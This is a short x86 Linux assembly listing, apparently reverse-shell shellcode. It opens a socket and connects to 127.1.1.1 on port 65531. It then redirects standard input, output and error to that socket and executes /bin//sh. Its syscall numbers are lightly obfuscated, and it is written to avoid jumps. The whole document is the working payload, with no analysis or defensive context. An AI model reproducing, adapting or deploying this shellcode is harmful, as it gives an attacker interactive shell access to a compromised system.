; slightly modified to have all straight with no jumps
  global _start
  section .text

  _start:
xor eax,eax
xor ebx,ebx

  createsocket:
push eax
inc eax
push eax
inc eax
push eax
mov ecx,esp
; socketcall
mov al,0x33
add al,0x33
inc ebx
int 0x80
mov esi,eax

  connect:
xor eax,eax
xor ebx,ebx

push 0xa2c910ac
; 127.1.1.1
push 0x0101017f
; 65531
push word 0xFBFF
push word 0x2
mov ecx,esp
push byte 0x10
push ecx
push esi
mov ecx,esp
mov bl,0x3
; socketcall
mov al,0x33
add al,0x33
int 0x80

  dupfd:
xor ecx,ecx
mov cl,0x3
mov ebx,esi
xor eax,eax

  dup2:
; 2
mov al,0x3f
dec ecx
int 0x80
; 1
mov al,0x3f
dec ecx
int 0x80
; 0
mov al,0x3f
dec ecx
int 0x80

  spawnshell:
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push ecx
mov edx,esp
push ecx
mov ecx,esp
mov al,0xB
int 0x80

 _end:
xor eax,eax
mov al,0x1
int 0x80
